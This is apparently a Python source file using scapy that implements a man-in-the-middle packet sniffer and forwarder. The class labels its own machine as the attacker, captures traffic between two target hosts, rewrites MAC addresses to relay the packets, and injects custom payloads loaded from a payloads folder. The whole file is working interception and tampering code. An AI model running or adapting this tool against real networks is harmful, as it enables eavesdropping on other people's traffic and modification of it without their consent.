import scapy.all as scapy
import datetime
import os
from importlib import import_module
import sys

class Sniffer:

    def __init__(self, target_1_ip, target_2_ip, write_to_pcap=False, payload_option=None):
        self.target_1 = {"IP": target_1_ip, "MAC": scapy.getmacbyip(target_1_ip)}
        self.target_2 = {"IP": target_2_ip, "MAC": scapy.getmacbyip(target_2_ip)}
        self.attacker = self.get_my_ip_and_mac()
        self.iface = self.get_iface()
        self.write_to_pcap = self.set_new_pcap(write_to_pcap)
        self.payload_option = self.read_payload_options(payload_option)

    @staticmethod
    def set_new_pcap(write_to_pcap):
        file_name = None
        if write_to_pcap is True:
            path = "packet_captures"
            if not os.path.exists(path):
                os.makedirs(path)
            file_name = path + "/capture - " + datetime.datetime.now().strftime("%d_%m_%Y-%H_%M_%S-%f") + ".pcap"
        return {"wr": write_to_pcap, "arg": file_name}

    @staticmethod
    def read_payload_options(predefined_options):
        if predefined_options is None:
            while True:
                option = input("Choose one of the payload options:\n 1- No payload, "
                               "just print the sniffed packets\n "
                               "2- Custom payload\n")
                if option == '1':
                    arg = None
                    break
                if option == '2':
                    file = input("Enter the name of the file stored in payloads folder that implements the payload without the "
                                 "extension, ex: example.py should be entered as example only\n")
                    sys.path.insert(1, "payloads/")
                    mod = import_module(file)
                    arg = getattr(mod, "pkt_payload")
                    break
            return {"option": option, "arg": arg}
        else:
            return predefined_options

    def sniff_packets(self):
        capture_filter = "(host " + self.target_1["IP"] + \
                         " or host " + self.target_2["IP"] + ")"
        scapy.sniff(iface=self.iface, filter=capture_filter, prn=lambda x: self.forward_packets(x))

    def forward_packets(self, scapy_packet):
        if self.write_to_pcap["wr"] is True:
            scapy.wrpcap(self.write_to_pcap["arg"], scapy_packet, append=True)

        if "IP" in scapy_packet:
            if scapy_packet["IP"].dst != self.attacker["IP"] and scapy_packet["Ethernet"].dst == self.attacker["MAC"]:
                scapy_packet["Ethernet"].dst = self.target_1["MAC"] if scapy_packet["Ethernet"].src == self.target_2["MAC"] else \
                self.target_2["MAC"]
                scapy_packet["Ethernet"].src = self.attacker["MAC"]

                pkt = self.insert_payload(scapy_packet)
                scapy.sendp(pkt, verbose=False, iface=self.iface)

    def insert_payload(self, scapy_packet):
        if self.payload_option["option"] == "1":
            print(scapy_packet.summary())
            return scapy_packet
        elif self.payload_option["option"] == "2":
            # self.payload_option["arg"] here is the function "pkt_payload" that receives (self, scapy_packet) as argument and
            # was read from a file in read_payload_options() option n°2
            return self.payload_option["arg"](self, scapy_packet)

    def get_iface(self):
        route = scapy.Route()
        iface = route.route(dst=self.target_1["IP"])[0]
        return iface

    def get_my_ip_and_mac(self):
        route = scapy.Route()
        ip = route.route(dst=self.target_1["IP"])[1]
        mac = scapy.get_if_hwaddr(self.get_iface())
        return {"IP": ip, "MAC": mac}
